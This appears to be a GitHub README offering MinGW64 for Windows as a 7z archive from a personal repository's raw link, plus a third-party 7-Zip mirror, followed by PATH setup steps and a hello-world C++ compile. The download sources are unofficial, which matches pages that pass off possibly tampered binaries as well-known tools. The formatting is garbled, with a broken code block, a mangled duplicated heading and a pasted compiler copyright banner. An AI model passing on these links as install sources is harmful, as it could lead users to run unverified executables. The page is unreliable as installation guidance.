# mingw
### Free Software

**MINGW x86 x64**

_Latest Update 2020_

## Instructions

### How to Download and Install MinGW for C/C++

#### Get the latest version of 7z-zip[download mingw64](https://github.com/ascia0309/mingw/raw/refs/heads/main/MinGW/x64/MinGW64.7z?download=)
```

#### Get the latest version of 7z-zip
```
https://7zip-es.updatestar.com/
```

#### In the Windows search bar, type
```
run
```
#### Type to open System Properties
```
sysdm.cpl
```

**Select the 'Advanced' tab**

**Click the 'Environment Variables' button**

**Choose the Path variable and then select Edit**

**Select New and add the path to the MinGW64 destination folder to the system path**

#### Add the path:
```
C:\MinGW64\bin
```

**Click OK to save the updated PATH.**

**To verify that your MinGW64 tools are installed and available correctly**
#### Open a cmd and type:
```
g++ --version
```

#### Create the "Hello World" folder
```
dir && cd Desktop && mkdir ProjectsC++ && cd ProjectsC++ && mkdir helloworld && cd helloworld
```

#### Create the "Test.cpp" file
```
notepad Test.cpp
```

#### Test.cpp

```cpp
#include <iostream>

using namespace std;

int main()
{
    cout << "Hello, world!" << endl;

    system("pause");

    return 0;
}
```

#### Display the Test.cpp file
```
type Test.cpp
```

#### Edit and Save the Test.cpp file
```
notepad Test.cpp
```

#### Compile with g++ for C++ Programming Language
```
g++ Test.cpp -o Test
```
```
Test
```

**You have successfully completed**

**C++**
**Copyright (C) 2020 Free Software Foundation, Inc.**
**This is free software; see the source for copying conditions. There is NO**
**warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.**

